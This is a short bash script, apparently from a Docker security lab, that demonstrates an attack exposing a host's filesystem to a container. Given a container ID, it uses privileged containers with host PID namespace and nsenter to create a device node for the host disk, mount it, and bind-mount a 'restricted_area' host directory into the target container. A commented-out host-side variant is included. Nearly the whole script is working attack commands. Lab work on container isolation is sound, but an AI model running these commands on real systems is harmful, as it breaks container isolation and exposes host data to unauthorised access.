#!/bin/bash

attack="home/ubuntu/Security-on-Docker/Attacks/Hosts_fs"
echo "Please give container's id:"
read container_id
docker inspect --format {{.State.Pid}} ${container_id} > PID
container_pid=$(cat PID)
rm PID

#Done by host
: <<'END'
sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount /dev/vda1 /tmpmount
sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount -o bind /tmpmount/${attack}/restricted_area /doot
sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- umount /tmpmount
END

#Done by attacker no2
#: <<'END'
docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} mknod --mode 0600 /dev/vda1 b 253 1

docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} mkdir -p /tmpmount
docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mount /dev/vda1 /tmpmount

#I can do mkdir and mknod with nsenter too -> version 4


docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mount -o bind /tmpmount/${attack}/restricted_area /doot

docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount umount /tmpmount
#END
